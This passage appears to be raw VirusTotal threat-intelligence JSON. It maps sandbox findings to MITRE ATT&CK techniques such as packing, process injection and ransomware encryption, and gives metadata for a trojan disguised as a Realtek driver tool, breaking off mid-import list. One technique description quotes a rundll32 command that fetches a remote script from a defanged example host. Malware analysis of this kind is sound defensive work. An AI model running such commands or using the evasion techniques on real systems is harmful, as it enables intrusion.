                "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Binary may include packed or crypted data"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/002/",
                "id": "T1027.002",
                "name": "Software Packing"
              },
              {
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Binary may include packed or crypted data"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/",
                "id": "T1027",
                "name": "Obfuscated Files or Information"
              },
              {
                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}).\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. \nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"  This behavior has been seen used by malware such as Poweliks. \nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1).\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Runs a DLL by calling functions"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1218/011/",
                "id": "T1218.011",
                "name": "Rundll32"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Spawns processes"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates a process in suspended mode (likely to inject code)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      },
      "DAS-Security Orcas": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "load third party dll"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1129/",
                "id": "T1129",
                "name": "Shared Modules"
              },
              {
                "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\nNative API functions (such as NtCreateProcess) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API CreateProcess() or GNU fork() will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "create new process"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1106/",
                "id": "T1106",
                "name": "Native API"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "collect system fingerprint info"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to manipulate, interrupt, or destroy your devices and data.\n\nThe impact tactic consists of techniques used by the adversary to execute his or her mission objectives but that do not cleanly fit into another category such as Collection. Mission objectives vary based on each adversary's goals, but examples include toll fraud, destruction of device data, or locking the user out of his or her device until a ransom is paid.",
            "techniques": [
              {
                "description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\nIn cloud environments, storage objects within compromised accounts may also be encrypted.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "call encryption algorithm library"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1486/",
                "id": "T1486",
                "name": "Data Encrypted for Impact"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0034/",
            "id": "TA0034",
            "name": "Impact"
          },
          {
            "description": "The adversary is trying to manipulate, interrupt, or destroy your systems and data.\n \nImpact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries’ goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.",
            "techniques": [
              {
                "description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\nIn cloud environments, storage objects within compromised accounts may also be encrypted.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "call encryption algorithm library"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1486/",
                "id": "T1486",
                "name": "Data Encrypted for Impact"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0040/",
            "id": "TA0040",
            "name": "Impact"
          }
        ]
      },
      "CAPA": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "parse PE header"
                  },
                  {
                    "severity": "INFO",
                    "description": "link function at runtime on Windows"
                  },
                  {
                    "severity": "INFO",
                    "description": "link many functions at runtime"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1129/",
                "id": "T1129",
                "name": "Shared Modules"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "check if file exists"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/1a1c5cfc2a24ba5eaa67035d1ca2b5d954597de7dda0154eaef8f66d537672b0/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "659c7d37ddea05204d13baad"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "tlsh": "T101145C6AB9D400F8DA77817489969627E63330483B306FEF4B649BB41F13AE17A39351",
      "vhash": "015066655d7555151115z900611z33z6015z20c00191z90a9z",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "crowdsourced_yara_results": [
        {
          "description": "Detects win.rc2fm.",
          "source": "https://malpedia.caad.fkie.fraunhofer.de/",
          "author": "Felix Bilstein - yara-signator at cocacoding dot com",
          "ruleset_name": "win.rc2fm_auto",
          "rule_name": "win_rc2fm_auto",
          "ruleset_id": "008ce50740"
        },
        {
          "rule_name": "win_rc2fm_auto",
          "description": "Detects win.rc2fm.",
          "author": "Felix Bilstein - yara-signator at cocacoding dot com",
          "ruleset_id": "008ce50740",
          "ruleset_name": "win.rc2fm_auto",
          "match_in_subfile": true,
          "source": "https://malpedia.caad.fkie.fraunhofer.de/"
        }
      ],
      "creation_date": 1567775036,
      "names": [
        "AlcRmv",
        "AlcRmv.exe",
        "27FC1DCB1B3DCA3E496F799A2944E4FB070AF39C.json",
        "c5119b8a75d4965e51e7424964bf92f2708b099a4e6049b13f8aaddabfb6860e_unpacked",
        "c5119b8a75d4965e51e7424964bf92f2708b099a4e6049b13f8aaddabfb6860e.vir",
        "fa2edd8a24266f9ecccea44b4b47100f.virus"
      ],
      "signature_info": {
        "product": "Realtek AC'97 Removing driver Tool",
        "description": "Driver Removing for Windows x64 or x86_32",
        "copyright": "Copyright (C) 2000-2005 Realtek Semiconductor Corp.",
        "original name": "AlcRmv.exe",
        "comments": "Developed by Desker ( Modify by Archeng )",
        "file version": "2, 0, 0, 4",
        "internal name": "AlcRmv"
      },
      "last_modification_date": 1704016049,
      "type_tag": "peexe",
      "times_submitted": 13,
      "total_votes": {
        "harmless": 1,
        "malicious": 0
      },
      "size": 190464,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.demp/invisimole",
        "popular_threat_category": [
          {
            "count": 23,
            "value": "trojan"
          },
          {
            "count": 11,
            "value": "dropper"
          }
        ],
        "popular_threat_name": [
          {
            "count": 13,
            "value": "demp"
          },
          {
            "count": 9,
            "value": "invisimole"
          },
          {
            "count": 6,
            "value": "fugrafa"
          }
        ]
      },
      "authentihash": "9c66116b15c2b33406d3c18f36fb65abf84bd049b8825b18196904cebe3bbdff",
      "detectiteasy": {
        "filetype": "PE64",
        "values": [
          {
            "version": "12.00.21005",
            "type": "Linker",
            "name": "Microsoft Linker"
          },
          {
            "info": "C",
            "version": "18.00.40629",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "version": "2013",
            "type": "Tool",
            "name": "Visual Studio"
          }
        ]
      },
      "last_submission_date": 1690880620,
      "meaningful_name": "AlcRmv.exe",
      "trid": [
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 48.7
        },
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 23.3
        },
        {
          "file_type": "OS/2 Executable (generic)",
          "probability": 9.3
        },
        {
          "file_type": "Generic Win/DOS Executable",
          "probability": 9.2
        },
        {
          "file_type": "DOS Executable Generic",
          "probability": 9.2
        }
      ],
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "malicious",
          "confidence": 64,
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "MALWARE",
            "EVADER"
          ]
        },
        "Dr.Web vxCube": {
          "category": "malicious",
          "sandbox_name": "Dr.Web vxCube",
          "malware_classification": [
            "MALWARE"
          ]
        },
        "DAS-Security Orcas": {
          "category": "harmless",
          "sandbox_name": "DAS-Security Orcas",
          "malware_classification": [
            "CLEAN"
          ]
        },
        "Lastline": {
          "category": "malicious",
          "sandbox_name": "Lastline",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "sha256": "c5119b8a75d4965e51e7424964bf92f2708b099a4e6049b13f8aaddabfb6860e",
      "type_extension": "exe",
      "tags": [
        "64bits",
        "peexe",
        "assembly"
      ],
      "last_analysis_date": 1704008483,
      "unique_sources": 7,
      "first_submission_date": 1568578823,
      "sha1": "27fc1dcb1b3dca3e496f799a2944e4fb070af39c",
      "ssdeep": "3072:mR7h1WRHNThzkErB6/mD1XhBggllqXuqQVDSvzDcWS8xrxqSNz/FjxRR:ah1WXtkWnD1Xv7vWXcbKhxR",
      "md5": "fa2edd8a24266f9ecccea44b4b47100f",
      "pe_info": {
        "resource_details": [
          {
            "lang": "ENGLISH US",
            "entropy": 3.032224416732788,
            "chi2": 45459.84,
            "filetype": "unknown",
            "sha256": "9cc0e8c34a019eb0e4450d3a9f39ed48817078ccd3958a7b8089d5b9c751af5e",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 3.434648275375366,
            "chi2": 83550.49,
            "filetype": "unknown",
            "sha256": "42fc7d7fe51ec7e82187a42b080d95221a7505cd053e0f8473fc4a66ea5bedc9",
            "type": "RT_DIALOG"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 3.2988221645355225,
            "chi2": 24144.42,
            "filetype": "unknown",
            "sha256": "e5041618065426e94d0b751b07426bbbe31132cdc53dc1c50281a7b9cc612942",
            "type": "RT_DIALOG"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 3.4407033920288086,
            "chi2": 58841.93,
            "filetype": "unknown",
            "sha256": "e9ca36f5d9f0495515494beddbeb2db84bb214011c77be6c07f9cb40d3170822",
            "type": "RT_DIALOG"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 3.325244665145874,
            "chi2": 24650.36,
            "filetype": "unknown",
            "sha256": "cfb5150a737e00b1fffd19a59535be955911fda8432ceda6a1983190ff9ec964",
            "type": "RT_DIALOG"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 3.2406952381134033,
            "chi2": 30345.84,
            "filetype": "unknown",
            "sha256": "d0d29e0d8538312c60e00aae23e2d3f25a2bfbc20a0bba95bece9e182a986fc0",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 3.35787296295166,
            "chi2": 56483.23,
            "filetype": "unknown",
            "sha256": "ca261e55674241d1aee0c6ffea53db155236715c38386d82414df862f1e46b7a",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 2.71321964263916,
            "chi2": 12178.26,
            "filetype": "unknown",
            "sha256": "2acc2f98ca2af99cbc875a1042472e1e01b9f6970a0441e569fdcdc2e99889e3",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 1.1013610363006592,
            "chi2": 8056.96,
            "filetype": "unknown",
            "sha256": "d72defe97eed93da117dfe36e483b9b7b09beafbc979a3455c05ff2692dca0c4",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 2.3540806770324707,
            "chi2": 9601.34,
            "filetype": "unknown",
            "sha256": "0cbcd31b394927e7266440d4200c433786242514fcea491ed86d492604f91db0",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 2.7637839317321777,
            "chi2": 13074.05,
            "filetype": "unknown",
            "sha256": "9672715f1ee143541c2d2e3d58c2ffcc40bd1931b1164678d2a73d6cabd29af2",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 1.0787549018859863,
            "chi2": 7961.82,
            "filetype": "unknown",
            "sha256": "ee0bb3b334e3e2528e7da2f8657e215db1f4ebfbf0f490271cbd4e21b4eb595a",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 3.077077865600586,
            "chi2": 18752.46,
            "filetype": "unknown",
            "sha256": "7de2eb3bb01c179d5d98b273efbbc70beee72a7f614feceace0f4980e3b24ce0",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 2.4052560329437256,
            "chi2": 11008.26,
            "filetype": "unknown",
            "sha256": "89e2a2e39ce2f374cc9cffd92b06b04cf713069c3ddeca7f2560c1fed4c7e575",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 2.0192408561706543,
            "chi2": 1797.6,
            "filetype": "ICO",
            "sha256": "873c68b88e9ef164dce3d673327a69a22052a0ba76a86a0706fcb4642e2cc855",
            "type": "RT_GROUP_ICON"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 3.4710733890533447,
            "chi2": 78334.27,
            "filetype": "unknown",
            "sha256": "11ab4143d1fcbff567b57d676f8073d1f62cb19274a1c43d7f84efb8c12ff933",
            "type": "RT_VERSION"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 4.911615371704102,
            "chi2": 4031.47,
            "filetype": "XML",
            "sha256": "4bb79dcea0a901f7d9eac5aa05728ae92acb42e0cb22e5dd14134f4421a3d8df",
            "type": "RT_MANIFEST"
          }
        ],
        "rich_pe_header_hash": "df1ba1e8c9eb38dd8dd169e7702d8ed7",
        "imphash": "4412be1660dcf7fc066578d4cf161355",
        "compiler_product_versions": [
          "[ C ] VS2013 UPD5 build 40629 count=5",
          "[ASM] VS2013 UPD5 build 40629 count=1",
          "[---] Unmarked objects count=196",
          "[RES] VS2013 build 21005 count=1",
          "[---] Resource count=1",
          "[LNK] VS2013 build 21005 count=1",
          "id: 0xcf, version: 65501 count=1",
          "id: 0xce, version: 65501 count=2",
          "id: 0xd1, version: 65501 count=1",
          "id: 0xd0, version: 65501 count=1",
          "id: 0xcb, version: 65501 count=25",
          "id: 0xe5, version: 21005 count=40"
        ],
        "resource_langs": {
          "ENGLISH US": 17
        },
        "machine_type": 34404,
        "timestamp": 1567775036,
        "resource_types": {
          "RT_MANIFEST": 1,
          "RT_STRING": 9,
          "RT_DIALOG": 4,
          "RT_ICON": 1,
          "RT_VERSION": 1,
          "RT_GROUP_ICON": 1
        },
        "sections": [
          {
            "name": ".text",
            "chi2": 1144301.38,
            "virtual_address": 4096,
            "entropy": 6.29,
            "raw_size": 139776,
            "flags": "rx",
            "virtual_size": 139530,
            "md5": "665c3b9ecfdbe7bc5a59d20a92ae9179"
          },
          {
            "name": ".rdata",
            "chi2": 799547.81,
            "virtual_address": 147456,
            "entropy": 5.58,
            "raw_size": 25600,
            "flags": "r",
            "virtual_size": 25142,
            "md5": "30110108304c3e45f227a471f10024fe"
          },
          {
            "name": ".data",
            "chi2": 6068.13,
            "virtual_address": 176128,
            "entropy": 7.83,
            "raw_size": 7680,
            "flags": "rw",
            "virtual_size": 11992,
            "md5": "afe069d70b17722d1f1b2c53ee607c40"
          },
          {
            "name": ".pdata",
            "chi2": 297378.94,
            "virtual_address": 188416,
            "entropy": 5.24,
            "raw_size": 8192,
            "flags": "r",
            "virtual_size": 7884,
            "md5": "6095ac4e28d82cf8f512a5a83663ae51"
          },
          {
            "name": ".rsrc",
            "chi2": 582407.38,
            "virtual_address": 196608,
            "entropy": 3.77,
            "raw_size": 7680,
            "flags": "r",
            "virtual_size": 7640,
            "md5": "d08283d72680c3dfe7c5aa339e390005"
          },
          {
            "name": ".reloc",
            "chi2": 79069,
            "virtual_address": 204800,
            "entropy": 1.78,
            "raw_size": 512,
            "flags": "r",
            "virtual_size": 132,
            "md5": "f6caf8bee7155e0df77499743d2ab48c"
          }
        ],
        "import_list": [
          {
            "library_name": "MPR.dll",
            "imported_functions": [
              "WNetAddConnection2W",
              "WNetCancelConnection2W"
            ]
          },
          {
            "library_name": "WINMM.dll",
            "imported_functions": [
              "waveInAddBuffer",
              "waveInClose",
              "waveInGetDevCapsW",
              "waveInGetNumDevs",
              "waveInOpen",
              "waveInPrepareHeader",
              "waveInReset",
              "waveInStart",
              "waveInStop",
              "waveInUnprepareHeader"
            ]
          },
          {
            "library_name": "WININET.dll",
            "imported_functions": [
              "HttpAddRequestHeadersA",
              "HttpOpenRequestA",
              "HttpQueryInfoA",
              "HttpSendRequestA",
              "InternetCloseHandle",
              "InternetConnectA",
              "InternetOpenW",
              "InternetReadFile",
              "InternetSetOptionW"
            ]
          },
          {
            "library_name": "GDI32.dll",
            "imported_functions": [
              "BitBlt",
              "CreateCompatibleDC",
              "CreateDCW",
              "CreateDIBSection",
              "DeleteDC",
              "DeleteObject",
              "GetDeviceCaps",
              "GetObjectW",
              "SelectObject"
            ]
          },
          {
            "library_name": "ADVAPI32.dll",
            "imported_functions": [
              "CryptAcquireContextW",
              "CryptCreateHash",
              "CryptDestroyHash",
              "CryptGetHashParam",
              "CryptHashData",
              "CryptReleaseContext",
              "GetTokenInformation",
              "OpenProcessToken",
              "RegCloseKey",
              "RegCreateKeyExW",
              "RegDeleteValueW",
              "RegEnumKeyExW",
              "RegEnumValueW",
              "RegOpenKeyExW",
              "RegQueryInfoKeyW",
              "RegQueryValueExW",
              "RegSetValueExW"
            ]
          },
          {
            "library_name": "KERNEL32.dll",
            "imported_functions": [
              "CancelWaitableTimer",
              "CloseHandle",
              "CompareFileTime",
              "CopyFileW",
              "CreateDirectoryW",
              "CreateEventA",
              "CreateEventW",
              "CreateFileMappingW",
              "CreateFileW",
              "CreateMutexA",
              "CreateMutexW",
              "CreatePipe",
              "CreateProcessW",
              "CreateRemoteThread",
              "CreateThread",
              "CreateToolhelp32Snapshot",
              "CreateWaitableTimerW",
              "DeleteFileW",
              "ExitProcess",
              "ExpandEnvironmentStringsW",
              "FindClose",
              "FindFirstFileW",
              "FindNextFileW",
              "FreeLibrary",
              "GetCommandLineW",
              "GetComputerNameA",
              "GetCurrentThreadId",
              "GetDriveTypeA",
              "GetDriveTypeW",
              "GetEnvironmentVariableW",
              "GetFileSize",
              "GetFileTime",
              "GetFullPathNameW",
              "GetLastError",
              "GetLocalTime",
              "GetLogicalDriveStringsA",
              "GetModuleFileNameW",
              "GetModuleHandleW",
              "GetProcAddress",
              "GetProcessHeap",
              "GetShortPathNameW",
              "GetSystemDirectoryA",
              "GetSystemTime",
              "GetSystemTimeAsFileTime",
              "GetTempPathW",
              "GetTickCount",
              "GetVersion",
              "GetVolumeInformationA",
              "GetVolumeInformationW",
              "HeapAlloc",
              "HeapFree",
              "HeapReAlloc",
              "K32GetProcessImageFileNameW",
              "LoadLibraryA",
              "lstrcatA",
              "lstrcatW",
              "lstrcmpA",
              "lstrcmpiA",
              "lstrcmpiW",
              "lstrcmpW",
              "lstrcpyA",
              "lstrcpyW",
              "lstrlenA",
              "lstrlenW",
              "MapViewOfFile",
              "Module32FirstW",
              "MoveFileExW",
              "MoveFileW",
              "OpenProcess",
              "PeekNamedPipe",
              "Process32FirstW",
              "Process32NextW",
              "ReadFile",
              "ReleaseMutex",
              "RemoveDirectoryW",
              "ResetEvent",
              "SetEndOfFile",
              "SetErrorMode",
              "SetEvent",
              "SetFilePointer",
              "SetFilePointerEx",
              "SetFileTime",
